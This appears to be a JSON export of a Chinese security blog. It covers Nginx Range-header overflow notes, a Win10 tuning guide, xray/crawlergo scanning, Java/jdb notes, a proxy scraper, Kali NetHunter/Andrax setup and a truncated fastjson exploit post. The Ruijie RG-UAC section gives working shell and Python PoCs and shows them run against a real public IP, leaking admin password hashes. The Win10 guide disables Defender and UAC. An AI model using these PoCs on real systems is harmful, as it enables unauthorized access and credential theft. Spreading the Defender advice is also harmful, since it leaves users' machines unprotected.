Content-Range: bytes -9223372036854742015-16584/16585` # 标识返回指定文件的部分内容在整个文件中所处的位置   详解\n  状态码\n HTTP 206 Partial Content成功状态响应代码表示请求已成功，服务器响应完成且传输了请求指定文件的数据区间，（请求包的 Range 字段指定的，响应包中的Content-Range标识 416 Requested Range Not Satisfiable 表示请求的范围越界（范围值超过了资源的大小） 200 OK 表示服务器不支持范围请求    HTTP版本要求 需要HTTP/1.1及以上版本支持\n  请求包中Range字段 （通过If-Range == ETag 或者 If-Range == Last-Modifled 来区分资源文件是否变动，如果源文件有改动，则重新走下载流程）\n  1 2 3 4  Range: bytes=20- ：获取请求中第 20 个字节之后数据； Range: bytes= -50 ：获取请求中最后 50 个字节的数据； Range: bytes=40-100 ：获取请求中第 40 个字节到第 100 个字节之间的数据。 Range: bytes=0-50, 100-150 ：获取多个长度的数据    响应包中对应字段  Accept-Ranges字段要求 Accept-Ranges: bytes字段则表示支持服务器支持范围请求，(不支持范围请求则为Accept-Ranges: none) Content-Type 说明媒体类型 包含多个数据区间，Content-Type: multipart/byteranges; boundary=0000000xxxx Content-Length 标识指定文件总字节数， Content-Range标识返回指定文件的部分内容在整个文件中所处的位置    参考\nCVE-2017-7529\nCVE-2017-7529-POC\nHTTP range请求\nNginx range 过滤器整形溢出漏洞\n","description":"","id":65,"section":"en","tags":null,"title":"Nginx","uri":"http://crkmythical.github.io/en/blog/nginx/"},{"content":"编写进度\n   开启卓越性能 win+r键输入powershell\n1  powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61   【win+r】键输入control 查看方式改为【大图标】，选择【电源选项】-【卓越性能】\n【选择电源按钮的功能】-【更改当前不可用的设置】-勾选【启用快速启动】-【保存修改】\n存储感知清理 打开【设置】-【存储】-【配置存储感知并立即运行】  关闭视觉效果 【win+r】运行sysdm.cpl打开【系统属性】面板-【高级系统设置】-标签页【高级】-性能【设置】-【视觉效果】-【最佳性能】\n解除网络限速 【win+r】输入gpedit.msc,定位到一下路径:\n【计算机配置】-【管理模版】-【网络】-【QoS数据包计划程序】-《限制可保留带宽》-勾选【已启用】，修改【带宽限制】： 0\n关闭Defender和实时防护 【win+r】输入gpedit.msc,定位到一下路径:\n【计算机配置】-【管理模版】-【windows组件】-【windows Defender 防病毒】:\n1. 启用【关闭Microsoft Defender防病毒】\n2. 【实时防护】-启用【关闭实时防护】\n关闭win10自动更新 【计算机配置】-【管理模版】-【Windows更新】-禁用【配置自动更新】\n磁盘优化 右键单击【C盘】-选择【属性】-标签页【工具】-对驱动器进行优化和碎片清理【优化】-【更改设置】\n关闭UAC通知并优化启动引导 【win+r】输入msconfig-标签页【工具】-【更改UAC设置】-「从不通知」\n-标签页【引导】-勾选【无GUI引导】-应用并确定\n禁用相关服务 【win+r】键输入services.msc ，查找以下服务并禁用\n 【Windows Search】 【Connected User Experiences and Telemetry】 【Diagnostic Execution Service】 【Diagnostic Policy Service】 【Diagnostic Service Host】 【Diagnostic System Host】 【HomeGroup Listener】 【HomeGroupProvider】 【SecurityCenter】 【Program CompatibilityAssistant Service】  禁用P2P分享服务 【win+i】键单击【更新与安全】-【传递优化】-关闭【允许从其他电脑下载】\n关闭休眠功能，保留睡眠功能 【win+x】选择命令行,执行powercfg -h off,重启后生效\n","description":"","id":66,"section":"en","tags":[""],"title":"win10系统优化","uri":"http://crkmythical.github.io/en/blog/win10%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96/"},{"content":"编写进度\n   发现大佬写了crawler_x_XRAY 的python版本，于是边写下了sh脚本的版本\ncrawlergo_x_XRAY.sh\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  #! /bin/bash ## File Name: crawler_xray.sh  # Author: Mr.Frame # Blog: https://askding.github.io/ # Date: Thu Mar 25 10:32:35 CST 2021 # Description: # 联动crawlergo和xray # 用法： # ./crawler_xray.sh \u0026lt;path/to/target.txt\u0026gt; # # 提示: # 需要修改chrome路径 thread=50 # 定义进程数 [ -e /tmp/$$.fifo ] || mkfifo /tmp/$$.fifo # 创建命名管道文件 exec 3\u0026lt;\u0026gt; /tmp/$$fifo # 创建FD 3，以可读（\u0026lt;）可写（\u0026gt;）的方式关联管道文件，FD 3具有命名管道的特性 rm -rf /tmp/$$fifo # 删除命名管道文件，通过FD 3 echo \u0026#34;./xray_darwin_amd64 webscan --listen 127.0.0.1:7777 --html-output xray-report.html\u0026#34; \u0026amp;\u0026amp; sleep 1.5 ./xray_darwin_amd64 webscan --listen 127.0.0.1:7777 --html-output xray-report.html \u0026amp; for i in $(seq $thread); do echo \u0026gt;\u0026amp;3 # 循环$thread次向FD 3写入\\n , 类比一个令牌  done echo \u0026#34;./crawlergo -c ~/.BurpSuite/burpbrowser/88.0.4324.192/Chromium.app/Contents/MacOS/Chromium -t 10 -f smart --fuzz-path --push-pool-max 10 --output-mode json --push-to-proxy http://127.0.0.1:7777 Target\u0026#34; \u0026amp;\u0026amp; sleep 1.5 while read url; do read -u 3 ( ./crawlergo -c ~/.BurpSuite/burpbrowser/88.0.4324.192/Chromium.app/Contents/MacOS/Chromium -t 5 -f smart --fuzz-path --push-pool-max 10 --output-mode json --push-to-proxy http://127.0.0.1:7777 $url )\u0026amp; # 最后需要归还令牌 echo \u0026gt;\u0026amp;3 # 再次向FD 3写入\\n , 类似归还令牌 done \u0026lt; $1 wait # 等待并发进程执行完毕，执行后续命令  if [ $? -eq 0 ]; then echo \u0026#34;Scan succeed. \u0026#34; else echo \u0026#34;scan failed \u0026#34; fi exec 3\u0026lt;\u0026amp;- # 关闭FD 3的读 exec 3\u0026gt;\u0026amp;- # 关闭FD 3的写   ","description":"","id":67,"section":"en","tags":null,"title":"xray_crawlergo","uri":"http://crkmythical.github.io/en/blog/xray-crawlergo/"},{"content":"编写进度\n   Table of Contents  编程基础概念  数据类型 运算符 控制语句  分支语句 if/switch 循环语句 while/do-while/for 跳转语句 break/continue/return/thow     类  抽象类 重载-Overloading stu instanceof Person 是Java中的二元运算符 反射 线程的五个状态   JVM调优  Debug with jdb  编译 \u0026amp; 运行 jdb命令格式 设置断点 查看线程 单步调试 查看变量 其他      Java 是彻底的、纯粹的面向对象语言，在Java中，一切都是对象，具有封装性、继承性、多态性。\n以类的方式组织代码，以对象的形式封装数据\n 多写(代码),多写(笔记),多写(文章)\n多练(交流),多练(思维),多练(技能)\n多分享(知识)，多提问(怎么了)，多思考(为什么)\n \n编程基础概念 \n数据类型 graph LR dataType[数据类型]--\u0026gt;basic[基础数据类型] dataType--\u0026gt;pointer[引用类型] basic--\u0026gt;character[字符型] basic--\u0026gt; number[数字型] basic--\u0026gt; boolean[布尔型] character--\u0026gt;char[char] number--\u0026gt;byte/short/int/long number--\u0026gt;float/double boolean--\u0026gt;Boolean pointer--\u0026gt;数组/类/接口 pointer--\u0026gt;enum  \n运算符   算术运算符 ： 加、减、乘、除、取余\n  关系运算符 ：不等、相等、大于、小于、大于等于、小于等于\n  逻辑操作服 ：与、或、非、异或\ngraph LR\noperate[运算符]\u0026ndash;\u0026gt;calc[算术运算符]\noperate[运算符]\u0026ndash;\u0026gt;relation[关系运算符]\noperate[运算符]\u0026ndash;\u0026gt;logic[逻辑运算符]\noperate[运算符]\u0026ndash;\u0026gt;bit[位运算符]\ncalc--\u0026gt;calcs[加+ 减- 乘* 除/ 取余%] relation--\u0026gt; relations[不等!= 相等== 大于\u0026gt; 小于\u0026lt; 大于等于\u0026gt;= 小于等于\u0026lt;=] logic--\u0026gt;logics[与and 或or 异或xor 非!] bit--\u0026gt;bits[左移\u0026lt;\u0026lt; \u0026gt;\u0026gt;右移 与\u0026amp; 或I 异或^ 取反]    \n控制语句 一般程序都是顺序执行代码语句的，通过控制语句可改变程序执行顺序\ngraph LR control[控制语句]--\u0026gt;switch control--\u0026gt;loop[循环语句] control--\u0026gt;goto[跳转语句] switch[分支语句]--\u0026gt; if/switch loop--\u0026gt;for/while/do-while goto--\u0026gt;break/continue/return/throw/try-catch  \n分支语句 if/switch \n循环语句 while/do-while/for \n跳转语句 break/continue/return/thow \n类 类加载顺序: 静态代码块-\u0026gt; 匿名代码块-\u0026gt; 构造函数\n类加载过程:\n  类初始化代码：\na. 基类初始化代码\nb. 子类初始化代码\n  基类实例初始化代码、基类构造方法\n  子类初始化代码、子类构造方法\npackage com.example.className;\nimport package1[.package2 \u0026hellip;].(className|);\nimport package1[.package2 \u0026hellip;].(className|);\n[public] [abstract|final] class className [extends superclass] [implements interfaceNameList]{\n//\n[public|protected|private] [static] [final]  variableName;\n [public|protected|private] [static] [final|abstract] [native] [synchronized] \u0026lt;dataType\u0026gt; methodName([paramList]) [throws exceptionList]{ }  }\n  \n抽象类  抽象类可以包含普通方法 抽象方法必须在抽象类中  \n重载-Overloading 在一个类中，两个方法名相同，参数列表1 不同 , 与返回类型无关。\n\nstu instanceof Person 是Java中的二元运算符 左边stu是对象，右边Person是类；\n当对象是右边类或子类所创建对象时，返回true；否则，返回false。\n\n反射 \n线程的五个状态 \nJVM调优 调优是针对方法区和堆区进行调优\n双亲委派机制：当某个类加载器加载一个类时，它首先委托它的上级类加载器去夹在，并递归这个操作，\n如果上级的类加载器没有家在，自己才会加载这个类。\n作用： 防止重复加在某个类，保证核心类不被篡改\n\nDebug with jdb \n编译 \u0026amp; 运行 javac -g path/to/src/*.java -d path/to/bin/ # 编译 jar cvfm path/to/xxx.jar manifest.mf path/to/bin/*.class # 打包 # 本地调试 java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=8000 \u0026lt;MainClassName\u0026gt; # 运行开启调试 or -jar xx.jar , 顺序： -Xdebug ... -jar .. jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8000 # jdb调试 # 远程调试 java -Xdebug -Xrunjdwp:transport=dt_socket,address=192.168.10.205:8000,suspend=y -jar remoting-debug.jar jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.10.205,port=8000  \njdb命令格式 jdb \u0026lt;options\u0026gt; \u0026lt;className\u0026gt; \u0026lt;arguments\u0026gt;\njava -Xdebug -Xrunjdwp:transport=dt_socket,address=8888,server=n,suspend=y com.lhx.cloud.javathread.MarkWord.JdbMain -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,address=3999,suspend=n -XDebug 启用调试。 -Xnoagent 禁用默认sun.tools.debug调试器。 -Djava.compiler=NONE 禁止 JIT 编译器的加载。 -Xrunjdwp 加载JDWP的JPDA参考执行实例。 transport 用于在调试程序和 VM 使用的进程之间通讯。 dt_socket 套接字传输。 dt_shmem 共享内存传输，仅限于 Windows。 server=y/n =y表示当前是调试服务端，=n表示当前是调试客户端 address=8000 调试服务器的端口号，客户端用来连接服务器的端口号。 suspend=y/n =n表示启动时不中断（如果启动时中断，一般用于调试启动不了的问题） jdb -attach \u0026lt;ip\u0026gt;:8888 #连接到JVM，本机IP即可省略 where options include: -? -h --help -help print this help message and exit -sourcepath \u0026lt;directories separated by \u0026quot;:\u0026quot;\u0026gt; directories in which to look for source files -attach \u0026lt;address\u0026gt; attach to a running VM at the specified address using standard connector -listen \u0026lt;address\u0026gt; wait for a running VM to connect at the specified address using standard connector -listenany wait for a running VM to connect at any available address using standard connector -launch launch VM immediately instead of waiting for 'run' command -listconnectors list the connectors available in this VM -connect \u0026lt;connector-name\u0026gt;:\u0026lt;name1\u0026gt;=\u0026lt;value1\u0026gt;,... connect to target VM using named connector with listed argument values -dbgtrace [flags] print info for debugging jdb -tclient run the application in the HotSpot(TM) Client Compiler -tserver run the application in the HotSpot(TM) Server Compiler options forwarded to debuggee process: -v -verbose[:class|gc|jni] turn on verbose mode -D\u0026lt;name\u0026gt;=\u0026lt;value\u0026gt; set a system property -classpath \u0026lt;directories separated by \u0026quot;:\u0026quot;\u0026gt; list directories in which to look for classes -X\u0026lt;option\u0026gt; non-standard target VM option  \n设置断点 stop \\ clear # 查看断点 stop at \u0026lt;className\u0026gt;:\u0026lt;Line No\u0026gt; # 在特定行号处设置断点 stop in \u0026lt;className\u0026gt;.\u0026lt;method\\field\u0026gt; # 在特定方法\\变量处设置断点  \n查看线程 threads # 查看所有线程 thread \u0026lt;id\u0026gt; # 查看单个线程 where # 查看线程堆栈 pop # 当前帧出栈, 且打印当前帧  \n单步调试 step # 执行当前行(进入函数体) = step into step up # 跳出当前函数,回到当前函数调用处 = step return stepi # 执行当前指令 next # 执行当前行(跳过函数调用) = step over cont # 运行到下一断点处 = resume  \n查看变量 list [line|method] # 查看代码 locals # 查看当前栈所有变量 set \u0026lt;var\u0026gt;=\u0026lt;expr\u0026gt; # 设置变量 eval/print \u0026lt;expr\u0026gt; # 显示java基础类型的值 dump \u0026lt;expr\u0026gt; # 输出java引用类型信息  \n其他 monitor \u0026lt;command\u0026gt;\t# 当程序暂停时自动执行命令 monitor\t# 列出所有的monitor watch \u0026lt;var\u0026gt;\t# 运行到变量的值改变时停止 unwatch \u0026lt;var\u0026gt;\t# 取消watch classes # 列出所有已知的类  Footnotes 1 个数，类型，排列顺序\n","description":"","id":68,"section":"en","tags":null,"title":"java-basic","uri":"http://crkmythical.github.io/en/blog/java-basic/"},{"content":"编写进度\n   在github上发现一个自动更新的http代理的仓库fate0\n因此编写了一个python脚本自动获取并添加到proxychains.conf配置文件中\ngetHttp.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  #!/usr/bin/env python3 # -*- coding: utf-8 -*- # Wed Mar 17 16:39:04 CST 2021 # AUTHOR: Mr.Frame  # Description: # 自动获取http代理，并添加到proxychains.conf中 #Usage: # python3 gethttp.py [/path/to/proxychains.conf] import requests import urllib3 import json def get_socks5(proxychains_path): \u0026#34;\u0026#34;\u0026#34; get socks from http://proxylist.fatezero.org/proxy.list. proxychains_path: str -\u0026gt; the path of proxycahins-ng configuation file. ***suggestion: enable round_robin_chain**** #strict_chain #dynamic_chain #round_robin_chain random_chain chain_len = 2 \u0026#34;\u0026#34;\u0026#34; proxychains_file = proxychains_path url=\u0026#34;http://proxylist.fatezero.org/proxy.list\u0026#34; headers={ \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36\u0026#34; } urllib3.disable_warnings() # 关闭ssl警告 try: response = requests.get(url=url,headers=headers,verify=False,timeout=2) except Exception as e: print(\u0026#34;\\033[31m[x]Connection failed\\033[0m\u0026#34;) print(e.__str__()) exit() if response.status_code == 200 : proxy_list = response.text.splitlines() socks_list=\u0026#34;\\n\\n# socks5 list from http://proxylist.fatezero.org/proxy.list\\n\u0026#34; for item in proxy_list: item_dict = json.loads(item) if \u0026#34;http\u0026#34; == item_dict[\u0026#39;type\u0026#39;] and \u0026#34;high_anonymous\u0026#34; == item_dict[\u0026#39;anonymity\u0026#39;]: socks_item = item_dict[\u0026#39;type\u0026#39;] +\u0026#34;\\t\u0026#34; + item_dict[\u0026#39;host\u0026#39;] + \u0026#34;\\t\u0026#34; + str(item_dict[\u0026#39;port\u0026#39;])+\u0026#34;\\n\u0026#34; socks_list += socks_item print(socks_list) # with open(\u0026#34;/usr/local/etc/proxychains.conf\u0026#34;,\u0026#39;a+\u0026#39;) as f: with open(proxychains_file,\u0026#34;a+\u0026#34;) as f: f.write(socks_list) if __name__ == \u0026#39;__main__\u0026#39;: import sys if sys.argv.__len__() == 1: get_socks5(\u0026#34;/usr/local/etc/proxychains.conf\u0026#34;) else: get_socks5(sys.argv[1])   执行脚本后,代理效果不是很好\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  proxychains4 curl cip.cc [proxychains] config file found: /usr/local/etc/proxychains.conf [proxychains] preloading /usr/local/Cellar/proxychains-ng/4.14/lib/libproxychains4.dylib [proxychains] DLL init: proxychains-ng 4.14 [proxychains] Random chain ... 222.78.210.229:57186 ... cip.cc:80 ... OK IP\t: 222.78.210.229 地址\t: 中国 福建 南平 运营商\t: 电信 数据二\t: 福建省南平市 | 电信 数据三\t: 中国福建省南平市 | 电信 URL\t: http://www.cip.cc/222.78.210.229   ","description":"","id":69,"section":"en","tags":null,"title":"getHttpProxy","uri":"http://crkmythical.github.io/en/blog/gethttpproxy/"},{"content":"编写进度\n   CNVD-2021-14536 锐捷RG-UAC统一上网行为管理审计系统存在信息泄漏，攻击者通过网页源代码可间接获取管理用户账户和密码的MD5值，解密后可登陆管理后台\nFofa查询关键字 title=\u0026quot;RG-UAC登录页面\u0026quot; \u0026amp;\u0026amp; body=\u0026quot;admin\u0026quot;\nCommand+u查看网页源码，Command+f搜索password即可看到密码的MD5\nBurp数据包\n进行解密即可\n1 2 3 4 5 6 7 8 9 10 11 12  ❯ time ./Ruijie.sh https://61.191.151.185:4443/ admin: \u0026#34;password\u0026#34;:\u0026#34;0e563b8ae893f8f78f943fd72f1425b8\u0026#34; guest: \u0026#34;password\u0026#34;:\u0026#34;fcf41657f02f88137a1bcf068a32c0a3\u0026#34; audit: \u0026#34;password\u0026#34;:\u0026#34;d33542b8458db8cabd9843fe7c1e8784\u0026#34; ./Ruijie.sh https://61.191.151.185:4443/ 0.02s user 0.01s system 5% cpu 0.507 total ~ via 🐍 v2.7.16 ❯ time ./Ruijie_get_passwd.py https://61.191.151.185:4443/ [o]Target:https://61.191.151.185:4443/ super_amdin\u0026#39;s password of MD5: 0e563b8ae893f8f78f943fd72f1425b8 ./Ruijie_get_passwd.py https://61.191.151.185:4443/ 0.14s user 0.04s system 25% cpu 0.680 total   POC-1 shell脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # !/bin/bash # File Name: Ruijie_get_password.sh # # Author: Mr.Frame # Date: Mon Mar 8 16:10:52 CST 2021 # Description: # CNVD-2021-14536 Ruijie 锐捷RG-UAC统一上网行为管理审计系统  # 核心语句: awk -F \u0026#34;[,]\u0026#34; \u0026#39;NR==148,/password/{print \u0026#34;admin: \u0026#34;$5 \u0026#34;\\n\u0026#34; \u0026#34;guest: \u0026#34; $20 \u0026#34;\\n\u0026#34; \u0026#34;audit: \u0026#34; $35 }\u0026#39; aa.txt Resp=$(mktemp) curl -k -sS \u0026#34;$1\u0026#34; \u0026gt;\u0026gt; $Resp awk -F \u0026#34;[,]\u0026#34; \u0026#39;NR==148,/password/{print \u0026#34;admin: \u0026#34;$5 \u0026#34;\\n\u0026#34; \u0026#34;guest: \u0026#34; $20 \u0026#34;\\n\u0026#34; \u0026#34;audit: \u0026#34; $35 }\u0026#39; $Resp rm $Resp   POC-2 python脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  #!/usr/bin/env python3 # -*- coding: utf-8 -*- # 2021-03-12 # Author: Mr.Frame  # Description: # CNVD-2021-14536 锐捷 RG-UAC 统一上网行为管理审计系统信息泄露漏洞  #Usage: # python3 ruijie_get_passwd \u0026lt;url\u0026gt; import requests import urllib3 import re def Ruijie_get_passwd(url): \u0026#34;Check CNVD-2021-14536 of Target\u0026#34; url=url headers={ \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36\u0026#34; } urllib3.disable_warnings() # 关闭ssl警告 try: response=requests.get(url=url,headers=headers,verify=False,timeout=2) except Exception as e: print(\u0026#34;\\033[31m[x]Connection failed\\033[0m\u0026#34;) print(e.__str__()) if response.status_code == 200 and \u0026#34;super_admin\u0026#34; in response.text and \u0026#34;password\u0026#34; in response.text: password=(re.search(\u0026#39;[a-fA-F0-9]{32}\u0026#39;, response.text)).group() print(\u0026#34;\\033[32m[o]Target:{}\\033[0m \\nsuper_amdin\u0026#39;s password of MD5: \\033[31m{}\\033[0m\u0026#34;.format(url,password)) else: print(\u0026#34;\\033[32mtarget:{}is safe\\033[0m\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: import sys if sys.argv.__len__() != 2: print(\u0026#34;python3 ruijie_get_passwd https://x.x.x.x:\u0026lt;port\u0026gt;\u0026#34;) else: Ruijie_get_passwd(sys.argv[1])   参考：\nCNVD-2021-14536 锐捷 RG-UAC 统一上网行为管理审计系统信息泄露漏洞 \n","description":"","id":70,"section":"en","tags":null,"title":"Ruijie_RG_UAC","uri":"http://crkmythical.github.io/en/blog/ruijie-rg-uac/"},{"content":"编写进度\n   谷歌代码规范\n编程属于设计行为，负责制造的是编译器或者构建系统\n程序员的能力是用来为用户创造价值的\nHow to code 文学编程(代码即设计文档) 用于表述文档的语言和编程语言结合在了一起\n高质量代码三大特性：可读性 \u0026gt; 简洁性 \u0026gt; 灵活性\n 可读性 第一要务 简洁性 保持代码简洁，不写多余的代码，不写重复的代码 灵活性 添加新代码时，与已有代码不冲突、不排斥\n高质量代码是拥有多种扩展方法、不存在多余要素、可读性高、易于理解的代码。  软件 \u0026ldquo;插件式\u0026quot;软件架构\n 非功能需求\n非功能对开发、运维、计算机资源的高校运用有较大影响，在发布后的运维阶段，比较大的问题多是由性能、系统宕机等非功能需求引起的。  再版-重构  在不改变代码外部行为的前提下，对代码内部结构进行优化，亦称代码体质优化\n 重构的征兆:\n 代码重复、命名不一致 函数体太长 模块规模太大、太多  图书-包 包：一种方便组织代码的机制(实现封装和模块化开发)，类似于文件夹，还可以解决命令冲突问题。\n等模块积攒到一定数量之后再自上而下的将模块按照某种有意义的单位整理并分割\n章节-模块 针对借口编程，而不是针对实现编程\n模块化：让修改模块所带来的影响停留在改模块内部\n模块间互相频繁调用表明折俩函数应放在一个模块\n抽象： 舍弃多余的东西，抽取对象共同的性质组成通用的概念\nParnas原则：\n 对于模块的使用者，仅提供使用该模块锁必需的所有信息，其余信息概不提供 对模块的开发者，仅提供实现该模块所必需的所有信息，其余信息概不提供  关注点分离： 将各个与关注点有关的代码集中起来做成独立的模块，与其他代码分离。如MVC模型，AOP(面向切面编程)\nOCP开闭原则: 对扩展开发、对修改关闭 面向对象的多态性是实现OCP的代表技术\n 内聚度: 单个模块内的功能的纯粹程度 耦合度: 衡量模块间关系紧密程度 模块间仅通过参数传递标量类型的数据作为模块间的接口  模块应以实现高内聚、低耦合的模块为目标\n序言-注释 注释的目的是帮值阅读代码的人了解作者写代码时的思想\n代码只能表达“What”、“How” 、注释表达“Why”\n注释内容要简洁明了，防止注释二义性\n模块注释 1 2 3 4 5 6 7 8 9  # File Name: xxx # Author: Mr.Frame # Version: 0.1 # Date:  # Description:  # # # Function List:   函数注释 1 2 3 4 5 6 7 8 9  # Function:  # Description:  # # Input:  # Output: # Return:  # Call:  # Called by:  # Others:   代码注释 注释应放在代码上方/或/右方\n目录-函数 将代码分割成级别统一的函数，函数一览起到目录的作用\n复合函数： 将函数结构化，各函数的处理将以调用比自己低一个级别的函数为中心\n不要在复合函数中调用不同抽象级别的函数，\n一个函数中不能既有连接数据库(低级处理)、又有执行业务逻辑(高级处理)\n将关系紧密的代码集中在一起函数化，同时保证关联性较弱的代码互不依赖\n通用过滤器：接收某种数据流后，经过加工输出文本格式的数据流\n函数行数不过百，仅输出重要信息\n防御性编程:\n 确认外部代码传来的数据输入值(有效范围、字符串长度) 确认参数的值(检测无效输入)  段落-代码块 正交性: 代码之间应具有独立性和分离性(例如：访问数据库代码和用户接口代码)\n代码块内列对齐\n不同的代码块之间有空行\n 数据常量化\n对代码的逻辑进行函数化、模块化\n 比较操作时，把改变的值放在左边，把稳定的值放在右边\n将逻辑和该逻辑处理的数据放在相近的位置\n处理流程尽量走直线,不使用条件分支\n每个控制条件都存在与之成对的反条件，\n保证控制条件具有统一性：\n即便某个if语句一定成立，也要考虑else语句的情况\n即便某个case语句一定成立，也要考虑default语句的情况\n即使某个变量不可能为空，也要检查该变量是否为NULL\n正文-代码 命名：名字是面向代码阅读者的用户界面。名字说明的是效果和目的，不是手段，\n  使用专业具体含义的词\n  全局变量名较长，局部变量名较短\n  恰当使用大小写和下划线\n  减少变量作用域\n 表示范围: max/min 、first/last 、begin/end 表示bool: is/has    注释/索引-Editor自带 图书中有注释和索引，但IDE和编辑器的跳转和搜索功能可以满足这部分需求。\n 「编程的原则：改善代码质量的101个方法」  How to read 代码阅读是一项机会主义、以目标为导向的思维活动。\n在大多数情况下，我们无法承担阅读和理解整个软件系统代码的代价，\n任何试图对代码进行精确分析的想法，都会导致陷入大量的类、文件和模块中。\n因此，我们必须积极低减少必须理解的代码\n 学习编写伟大代码的方式: 阅读大量优质代码\n阅读优秀源码基础: 设计模式 算法、数据结构  在熟悉基本的编程和计算机科学概念后，通过阅读一套设计良好的软件系统的内部细节\n可以学到新颖的架构模式、数据结构、编码方法、算法、风格和文档规范、API、甚至一门新的计算机语言。\n 良好习惯: 有目标地阅读辨认编写的高质量代码(遇到库元素就阅读库文档)  Steps  阅读README，安装依赖，编译运行,编译不成功不读 主框架,阅读main函数，梳理主逻辑  a. 函数调用顺序、及其参数 b.    ","description":"","id":71,"section":"en","tags":[""],"title":"code_of_principle","uri":"http://crkmythical.github.io/en/blog/code-of-principle/"},{"content":"编写进度\n   Kali Nethunter 准备工作  安装android-plateform-tools brew install android-platform-tools 三个zip包  [TWRP for 10](https://dl.twrp.me/guacamole/） Magisk Disable-Dm-Verity_ForceEncrypt\n可选   谷歌框架  刷入  设置-\u0026gt;系统-\u0026gt;开发者模式界面，开启OEM解锁、USB调试两个个选项 手机链接电脑运行如下命令  1 2 3 4 5 6 7 8 9 10  adb reboot bootloader # 进入fastboot模式 fastboot oem unlock # 解锁，手机出现解锁界面，用音量键选择UNLOCK THE BOOTLOADER，电源键确认 fastboot boot twrp-3.x.x.x.img # 刷入twrp镜像,等待几秒进入临时twrp模式 adb push twrp-3.x.x.zip /sdcard # 上传twrp的zip包，并刷入twrp镜像, adb reboot recovery # 重启到recovery模式 adb push Magisk-vx.zip # 上传Magisk包并刷入 adb push Disable_Dm-Verify-ForceEncrypt_xx.zip /sdcard # 解锁Data分区，上传Disable_Dm-Verity-ForceEncrypt并刷入 adb reboot # 重启，进行初始化设置 adb push nethunter-2021.1-oneplus7-oos-ten-kalifs-full.zip # 上传kali nethunter镜像并刷入 adb reboot # 重启   关闭系统更新提示 1 2 3  adb shell pm disable-user com.oneplus.opbackup # 屏蔽更新 adb shell pm clear com.oneplus.opbackup # 清除通知 adb shell enable com.oneplus.opbackup # 恢复更新   升级系统保留ROOT权限操作 一加7T如何保留ROOT OTA升级系统\n一加7 OTA升级保留ROOT\nAndrax Andrax文档\nAndrax仓库\n下载Andrax-mobile.zip\n手机连接电脑输入\n1 2 3 4 5 6  unzip ANDRAX-Mobile.zip adb push andraxcorev6001.tar.xz.cpt /sdcard/Download adb install ANDRAXMobile6001.apk adb shell pm list packages # 查看所有包 adb shell dumpsys activity com.thecrackertechnology.andrax # 获取指定包的Activity adb shell am start -n com.thecrackertechnology.andrax/com.thecrackertechnology.dragonterminal.ui.term.NeoTermActivity # 点击”OK“   root和andrax默认密码andrax\nSSH 1 2  sudo service --status-all sudo service ssh start   VNC 1 2  sudo service vnc start vnc-viewer 192.168.43.73:5901   Bluetooth Hacking  open Andrax Terminal with Recovery shell  1 2  su cd /;cat *.rc | grep -i \u0026#34;bluetooth\u0026#34; | grep -i \u0026#34;net_bt_stack\u0026#34; | grep -i \u0026#34;\\/dev\u0026#34; # 定位串口   输出\nchown bluetooth net_bt_stack /dev/ttyS0\nopen Andrax Terminal  1 2 3  sudo stty -F /dev/ttyS0 # 查看串口速率 sudo hciattach -s 115200 /dev/ttyS0 any 3000000 # 创建接口 sudo hciconfig hci0 up # 激活接口   参考\n一加7基于安卓10版本安装NetHunter\n一加7Pro把玩Nethunter\n就砖\nTWRP备份与还原操作\nTWRP备份与还原操作2\nAndrax和nethunter介绍\n","description":"","id":72,"section":"en","tags":null,"title":"kali_nethunter and Andrax","uri":"http://crkmythical.github.io/en/blog/kali-nethunter_and_andrax/"},{"content":"编写进度\n   基础知识 基础语法及关键字\n数据类型 类型是编译器用来分配存储空间的模板，\n变量与常量 变量是编译器分配给的内存地址(0x0000~0xffff)的别名\n运算符  and/or短路逻辑: 表达式从左至右运算 ( A or B and C or D)，仅当A(or的左侧逻辑值)为True，则短路其后所有表达式 ( A and B and C or D), 仅当A(and左侧逻辑值)为False，则短路其后所有表达式  流程控制及异常处理 顺序语句 分支语句 if型 case型 循环语句 for型 while型 until型 函数 文件处理 进阶知识 多线程支持 编程思想 开源类库 开源框架 底层原理 ","description":"","id":73,"section":"en","tags":null,"title":"python-basic","uri":"http://crkmythical.github.io/en/blog/python-basic/"},{"content":"编写进度\n   漏洞url http://x.x.x.x/demo/login\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  POST /demo/login HTTP/1.1 Host: x.x.x.x Content-Length: 35 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Content-Type: application/json Origin: http://106.14.21.5:31180 Referer: http://106.14.21.5:31180/demo/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: td_cookie=3992386100; JSESSIONID=4fade538-068e-4ee7-90b3-fb0742047510 Connection: close {\u0026#34;name\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;admin\u0026#34;}   利用 在vps(47.106.65.x)上生成payload fastjson_tool.jar\n1 2 3 